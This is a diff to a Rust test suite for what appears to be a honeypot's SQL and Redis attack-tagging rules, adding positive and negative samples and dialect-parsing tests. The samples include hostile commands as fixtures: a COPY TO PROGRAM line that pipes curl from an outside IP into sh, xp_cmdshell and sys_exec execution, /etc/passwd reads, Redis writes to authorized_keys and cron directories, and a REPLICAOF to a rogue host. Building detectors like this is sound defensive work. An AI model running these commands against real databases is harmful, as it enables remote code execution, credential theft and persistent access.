@@ -10,6 +10,12 @@ use crate::ioc;
 /// The ids of the rules that match `sample`, read as the evidence the rule's scope names.
 fn fired(scope: Scope, sample: &str) -> Vec<&'static str> {
     let matches = match scope {
+        // Read in every dialect, so a negative must hold in all three.
+        Scope::Sql => ["postgresql", "mysql", "mssql"]
+            .iter()
+            .flat_map(|sensor| tag_sql(sensor, sample))
+            .collect(),
+        Scope::Redis => tag_redis(&redis_metadata(sample)),
         Scope::Command => tag_command(sample),
         Scope::Download => tag_download(Some(sample), None),
         Scope::Upload => tag_upload(sample),
@@ -17,6 +23,21 @@ fn fired(scope: Scope, sample: &str) -> Vec<&'static str> {
         Scope::Indicator => tag_indicators(&ioc::extract_from_command(sample)),
     };
     matches.into_iter().map(|m| m.rule).collect()
+}
+
+/// The metadata the redis sensor records for a command typed as words: `CONFIG SET param value`
+/// carries `param` and `value`, any other command its words after the name as `args`.
+fn redis_metadata(line: &str) -> serde_json::Value {
+    let words: Vec<&str> = line.split_whitespace().collect();
+    if words.len() >= 2 && words[..2].join(" ").eq_ignore_ascii_case("CONFIG SET") {
+        serde_json::json!({
+            "command": "CONFIG SET",
+            "param": words.get(2),
+            "value": words.get(3),
+        })
+    } else {
+        serde_json::json!({ "command": words.first(), "args": words.get(1..) })
+    }
 }
 
 const SHA: &str = "ab12ab12ab12ab12ab12ab12ab12ab12ab12ab12ab12ab12ab12ab12ab12ab12";
@@ -173,6 +194,126 @@ const POSITIVE: &[(&str, &[&str])] = &[
             "service cloudmonitor stop",
             "systemctl disable --now fail2ban",
             "/etc/init.d/aegis stop",
+        ],
+    ),
+    (
+        "sql-account-password",
+        &[
+            "ALTER USER app WITH PASSWORD 'fixture-pw-1'",
+            "alter role app password 'fixture-pw-1'",
+            "ALTER USER app PASSWORD NULL",
+            "ALTER LOGIN sa WITH PASSWORD = 'fixture-pw-1'",
+            "ALTER USER 'app'@'%' IDENTIFIED BY 'fixture-pw-1'",
+            "SET PASSWORD FOR app = 'fixture-pw-1'",
+            "EXEC sp_password NULL, 'fixture-pw-1', 'sa'",
+            "SELECT version(); ALTER USER app WITH ENCRYPTED PASSWORD 'fixture-pw-1'",
+            "ALTER/**/USER app PASSWORD 'fixture-pw-1'",
+        ],
+    ),
+    (
+        "sql-privilege-change",
+        &[
+            "GRANT ALL PRIVILEGES ON DATABASE d TO app",
+            "grant pg_read_server_files to app",
+            "GRANT SELECT ON t TO PUBLIC",
+            "ALTER USER app WITH SUPERUSER",
+            "ALTER ROLE app SUPERUSER LOGIN",
+            "EXEC sp_addsrvrolemember 'app', 'sysadmin'",
+            "exec master..sp_addrolemember 'db_owner', 'app'",
+            "ALTER SERVER ROLE sysadmin ADD MEMBER app",
+        ],
+    ),
+    (
+        "sql-account-create",
+        &[
+            "CREATE USER app WITH PASSWORD 'fixture-pw-1'",
+            "create user 'app'@'%' identified by 'fixture-pw-1'",
+            "CREATE OR REPLACE USER app",
+            "CREATE ROLE app LOGIN",
+            "CREATE ROLE app WITH SUPERUSER LOGIN",
+            "CREATE LOGIN app WITH PASSWORD = 'fixture-pw-1'",
+            "exec sp_addlogin 'app', 'fixture-pw-1'",
+        ],
+    ),
+    (
+        "sql-os-command",
+        &[
+            "COPY t FROM PROGRAM 'id'",
+            "copy (select 1) to program 'curl http://198.51.100.7/x | sh'",
+            "EXEC xp_cmdshell 'whoami'",
+            "exec master..xp_cmdshell 'dir'",
+            "SELECT 1; EXEC/**/xp_cmdshell 'id'",
+            "EXEC sp_configure 'xp_cmdshell', 1",
+            "SELECT sys_exec('id')",
+            "select SYS_EVAL('id')",
+            "CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so'",
+        ],
+    ),
+    (
+        "sql-version-discovery",
+        &[
+            "SELECT version();",
+            "select VERSION ( )",
+            "SELECT 1; select version()",
+            "SELECT/**/version()",
+            "SELECT @@version",
+            "select @@VERSION_COMMENT",
+            "SHOW server_version",
+        ],
+    ),
+    (
+        "sql-user-discovery",
+        &[
+            "SELECT current_user",
+            "select CURRENT_USER;",
+            "select session_user, current_database()",
+            "SELECT 1, current_user FROM dual",
+            "SELECT user",
+            "SELECT user()",
+            "SELECT system_user",
+            "SELECT suser_name()",
+            "SELECT USER_NAME ()",
+        ],
+    ),
+    (
+        "sql-file-read",
+        &[
+            "SELECT pg_read_file('/etc/passwd')",
+            "select pg_read_binary_file('/etc/passwd')",
+            "SELECT lo_import('/etc/passwd')",
+            "SELECT/**/lo_import ('/etc/passwd')",
+            "SELECT LOAD_FILE('/etc/passwd')",
+            "COPY t FROM '/etc/passwd'",
+            "LOAD DATA INFILE '/etc/passwd' INTO TABLE t",
+            "LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE t",
+            "SELECT * FROM OPENROWSET(BULK 'C:/x.txt', SINGLE_CLOB) AS a",
+        ],
+    ),
+    (
+        "redis-config-cron",
+        &[
+            "CONFIG SET dir /var/spool/cron",
+            "config set dir /var/spool/cron/crontabs/",
+            "CONFIG SET DIR /etc/cron.d",
+            "CONFIG SET dir /etc/cron.hourly/x",
+        ],
+    ),
+    (
+        "redis-config-authkeys",
+        &[
+            "CONFIG SET dir /root/.ssh",
+            "CONFIG SET dir /home/u/.ssh/",
+            "CONFIG SET dbfilename authorized_keys",
+            "config set dbfilename authorized_keys2",
+            "CONFIG SET dbfilename /root/.ssh/authorized_keys",
+        ],
+    ),
+    (
+        "redis-replicaof",
+        &[
+            "SLAVEOF 198.51.100.7 6379",
+            "replicaof 203.0.113.9 6379",
+            "REPLICAOF 198.51.100.7",
         ],
     ),
 ];
@@ -374,6 +515,145 @@ const NEGATIVE: &[(&str, &[&str])] = &[
             "service nginx stop",
         ],
     ),
+    (
+        "sql-account-password",
+        &[
+            "ALTER USER app SET search_path = public",
+            "ALTER USER app PASSWORD EXPIRE",
+            "ALTER USER app RENAME TO password",
+            "ALTER USER app VALID UNTIL 'infinity'",
+            "ALTER TABLE users ALTER COLUMN password TYPE text",
+            "SET password_encryption = 'scram-sha-256'",
+            "SELECT 'ALTER USER app PASSWORD ''x'''",
+            "SELECT password FROM users WHERE name = 'alter user'",
+            "-- ALTER USER app PASSWORD 'x'",
+            "/* ALTER USER app PASSWORD 'x' */ SELECT 1",
+            "CREATE TABLE alter_user_password (id int)",
+        ],
+    ),
+    (
+        "sql-privilege-change",
+        &[
+            "REVOKE ALL ON t FROM app",
+            "SELECT * FROM grants",
+            "SELECT grant_date FROM t WHERE x = 'to'",
+            "SELECT 'GRANT ALL TO x'",
+            "-- GRANT ALL TO x",
+            "GRANT SELECT ON t",
+            "ALTER USER app NOSUPERUSER",
+            "ALTER ROLE app SET superuser_reserved_connections = 1",
+            "EXEC sp_helpsrvrolemember",
+            "SELECT 'sp_addsrvrolemember'",
+        ],
+    ),
+    (
+        "sql-account-create",
+        &[
+            "CREATE USER MAPPING FOR app SERVER s",
+            "CREATE ROLE grp",
+            "CREATE ROLE app NOLOGIN",
+            "CREATE TABLE users (id int)",
+            "CREATE TABLE login (id int)",
+            "CREATE INDEX user_idx ON t (a)",
+            "DROP USER app",
+            "SELECT 'CREATE USER x'",
+            "EXEC sp_helplogins",
+        ],
+    ),
+    (
+        "sql-os-command",
+        &[
+            "COPY program FROM STDIN",
+            "COPY t FROM STDIN",
+            "COPY t FROM '/tmp/in.csv'",
+            "SELECT program FROM jobs",
+            "SELECT 'xp_cmdshell'",
+            "SELECT * FROM xp_cmdshell_log",
+            "SELECT \"xp_cmdshell\" FROM t",
+            "SELECT sys_exec_count FROM t",
+            "SELECT sys_exec FROM t",
+            "-- xp_cmdshell",
+            "EXEC sp_configure 'show advanced options', 1",
+            "EXEC sp_who",
+            "SELECT 'COPY t FROM PROGRAM ''id'''",
+            "CREATE FUNCTION f() RETURNS int AS 'select 1' LANGUAGE sql",
+        ],
+    ),
+    (
+        "sql-version-discovery",
+        &[
+            "SELECT version FROM migrations",
+            "SELECT * FROM versions",
+            "SELECT version(1)",
+            "SELECT 'version()'",
+            "-- select version()",
+            "SELECT @@versions",
+            "SHOW server_version_num",
+            "SELECT schema_version() ",
+        ],
+    ),
+    (
+        "sql-user-discovery",
+        &[
+            "SELECT user FROM mysql.user",
+            "SELECT user, host FROM mysql.user",
+            "SELECT user_name FROM accounts",
+            "SELECT username FROM users",
+            "SELECT * FROM t WHERE owner = current_user",
+            "ALTER TABLE t OWNER TO current_user",
+            "SELECT current_user_id FROM t",
+            "SELECT 'current_user'",
+            "-- select current_user",
+        ],
+    ),
+    (
+        "sql-file-read",
+        &[
+            "COPY t FROM STDIN",
+            "COPY t FROM PROGRAM 'id'",
+            "COPY t TO '/tmp/out'",
+            "SELECT lo_export(1, '/tmp/x')",
+            "SELECT * FROM t INTO OUTFILE '/tmp/o'",
+            "SELECT pg_read_file FROM t",
+            "SELECT * FROM pg_read_file_log",
+            "SELECT load_file_count FROM t",
+            "SELECT 'load_file(''/etc/passwd'')'",
+            "-- LOAD DATA INFILE '/x'",
+        ],
+    ),
+    (
+        "redis-config-cron",
+        &[
+            "CONFIG SET dir /tmp",
+            "CONFIG SET dir /etc/cron.d.bak",
+            "CONFIG SET dir /var/spool/cronx",
+            "CONFIG SET dir /home/u/etc/cron.d",
+            "CONFIG SET dbfilename /etc/cron.d",
+            "CONFIG SET dir",
+            "SET dir /etc/cron.d",
+        ],
+    ),
+    (
+        "redis-config-authkeys",
+        &[
+            "CONFIG SET dir /root/.ssh2",
+            "CONFIG SET dir /root/ssh",
+            "CONFIG SET dir /tmp/x.ssh",
+            "CONFIG SET dbfilename authorized_keys.bak",
+            "CONFIG SET dbfilename dump.rdb",
+            "SET dbfilename authorized_keys",
+        ],
+    ),
+    (
+        "redis-replicaof",
+        &[
+            "SLAVEOF NO ONE",
+            "replicaof no one",
+            "SLAVEOF",
+            "SET replicaof 198.51.100.7",
+            "CONFIG SET replicaof x",
+        ],
+    ),
 ];
 
 fn scope_of(rule: &str) -> Scope {
@@ -488,6 +768,105 @@ fn credentials_in_a_matched_url_are_redacted() {
     assert!(!url.matched.contains("hunter2"), "{url:?}");
     let d = tag_download(Some("http://admin:hunter2@198.51.100.7/x"), None);
     assert!(!d[0].matched.contains("hunter2"), "{d:?}");
+}
+
+fn sql_tokens(sensor: &str, sql: &str) -> Vec<(&'static str, String)> {
+    tag_sql(sensor, sql)
+        .into_iter()
+        .map(|m| (m.rule, m.matched))
+        .collect()
+}
+
+#[test]
+fn a_sql_token_is_the_keyword_that_matched_and_never_a_literal() {
+    // The live cred-pg pair: a version probe, then a password change.
+    assert_eq!(
+        sql_tokens(
+            "postgresql",
+            "SELECT version(); ALTER USER fixture_acct WITH PASSWORD 'fixture-secret-9'"
+        ),
+        [
+            ("sql-account-password", "ALTER USER PASSWORD".to_string()),
+            ("sql-version-discovery", "version()".to_string()),
+        ]
+    );
+    let lines = [
+        "ALTER USER fixture_acct PASSWORD 'fixture-secret-9'",
+        "ALTER USER 'fixture_acct'@'%' IDENTIFIED BY 'fixture-secret-9'",
+        "CREATE USER fixture_acct WITH PASSWORD 'fixture-secret-9'",
+        "EXEC sp_addlogin 'fixture_acct', 'fixture-secret-9'",
+        "SET PASSWORD FOR fixture_acct = 'fixture-secret-9'",
+        "COPY t FROM PROGRAM 'echo fixture-secret-9'",
+        "SELECT pg_read_file('/home/fixture-secret-9/key')",
+        "SELECT sys_exec('echo fixture-secret-9')",
+        "GRANT ALL ON fixture-secret-9 TO fixture_acct",
+    ];
+    for line in lines {
+        let hits = sql_tokens("postgresql", line);
+        assert!(!hits.is_empty(), "{line:?} should be tagged");
+        for (rule, token) in hits {
+            assert!(
+                !token.contains("fixture-secret") && !token.contains("fixture_acct"),
+                "{rule} stored {token:?} for {line:?}"
+            );
+        }
+    }
+}
+
+#[test]
+fn the_dialect_of_the_sensor_decides_what_is_code() {
+    // In MySQL a backslash escapes the quote, so the string runs to the last quote and the
+    // CREATE USER is inside it; PostgreSQL ends the string at the backslash-quote.
+    let line = "SELECT 'a\\'; CREATE USER fixture_acct; SELECT 'b'";
+    assert_eq!(sql_tokens("mysql", line), []);
+    assert_eq!(
+        sql_tokens("postgresql", line),
+        [("sql-account-create", "CREATE USER".to_string())]
+    );
+    // A MySQL executable comment runs; elsewhere it is a comment.
+    let hidden = "SELECT /*!50000 sys_exec*/('id')";
+    assert_eq!(
+        sql_tokens("mysql", hidden),
+        [("sql-os-command", "sys_exec".to_string())]
+    );
+    assert_eq!(sql_tokens("postgresql", hidden), []);
+    // PostgreSQL dollar quotes hide a keyword that MySQL would read as code.
+    let dollar = "SELECT $$ CREATE USER x; $$";
+    assert_eq!(sql_tokens("postgresql", dollar), []);
+}
+
+#[test]
+fn a_statement_after_the_first_is_read_and_other_sensors_are_not_read_as_sql() {
+    let multi = "SELECT 1; SELECT 2; EXEC xp_cmdshell 'id'";
+    assert_eq!(
+        sql_tokens("mssql", multi),
+        [("sql-os-command", "xp_cmdshell".to_string())]
+    );
+    let meta = serde_json::json!({ "command": "ALTER USER a PASSWORD 'x'" });
+    for sensor in ["ssh", "telnet", "http", "smtp", "adb", "mongodb", ""] {
+        assert!(
+            tag_database_command(sensor, "ALTER USER a PASSWORD 'x'", &meta).is_empty(),
+            "{sensor} is not a database sensor"
+        );
+    }
+    assert_eq!(
+        tag_database_command("postgresql", "ALTER USER a PASSWORD 'x'", &meta).len(),
+        1
+    );
+    // Shell words are not SQL, and SQL is not a shell line.
+    assert!(tag_sql("postgresql", "wget http://198.51.100.7/x; chmod +x x").is_empty());
+    assert!(tag_command("SELECT version();").is_empty());
+    // The redis sensor is read from its fields, not from its command name.
+    let cfg =
+        serde_json::json!({ "command": "CONFIG SET", "param": "dir", "value": "/etc/cron.d" });
+    let hits = tag_database_command("redis", "CONFIG SET", &cfg);
+    assert_eq!(
+        hits.iter()
+            .map(|m| (m.rule, m.matched.as_str()))
+            .collect::<Vec<_>>(),
+        [("redis-config-cron", "CONFIG SET dir")]
+    );
+    assert!(tag_database_command("postgresql", "CONFIG SET", &cfg).is_empty());
 }
 
 /// `docs/reference/attack-tagging.md` owns the human-readable rule list: one row per rule id, each
